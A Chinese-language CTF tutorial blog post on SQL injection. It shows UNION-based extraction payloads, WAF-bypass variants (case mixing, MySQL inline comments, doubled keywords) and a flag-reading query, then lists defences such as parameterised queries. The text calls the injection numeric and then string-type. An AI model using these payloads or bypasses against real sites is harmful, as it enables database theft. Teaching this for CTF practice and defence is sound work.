---
id: 1005
title: CTF Web 入门：SQL 注入从零到绕过 WAF
date: 2026-10-15
tags: [CTF, Web安全]
status: published
author: K4
cover: null
---

CTF 是练习 Web 安全最好的练兵场。本文用一个典型题目，完整走一遍**判断注入 → 获取数据 → 绕过 WAF**的流程。

## 0x00 题目分析

页面带查询参数 `?id=1`，返回不同内容，疑似数字型注入。

```text
?id=1       正常返回
?id=1'      报错：You have an error in your SQL syntax
?id=1 and 1=1   正常
?id=1 and 1=2   异常
```

确认存在注入，且为字符型。

## 0x01 获取字段数

```sql
' order by 3--
```

order by 到 4 时报错，说明字段数为 3。

## 0x02 联合查询

```sql
' union select 1,2,database()--
```

拿到当前库名 `ctf_web`，继续拖库：

```sql
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctf_web'--
```

## 0x03 绕过 WAF

发现 `union select` 被拦截，尝试变形：

```sql
-- 1. 大小写混淆（WAF 未忽略大小写时）
' UnIoN sElEcT 1,2,database()--

-- 2. 内联注释
'/*!50000union*/ /*!50000all*/ /*!50000select*/ 1,2,database()--

-- 3. 双写关键字
' ununionion selseelectect 1,2,database()--
```

其中 MySQL 内联注释 `/*!50000*/` 生效，成功绕过。

## 0x04 读取 Flag

```sql
' union select 1,2,flag from ctf_web.flag--
```

## 0x05 防御视角

作为蓝方，这类题目的修复很简单：

1. 参数化查询，从根上消除注入
2. 数据库账号最小权限，禁止读取 `information_schema`
3. 统一错误页，不向前端泄露 SQL 细节
4. WAF 作为纵深，不作为唯一手段

> 注入攻防的本质：**绕过是游击战，参数化是阵地战**。修好代码，比写一万条 WAF 规则都管用。
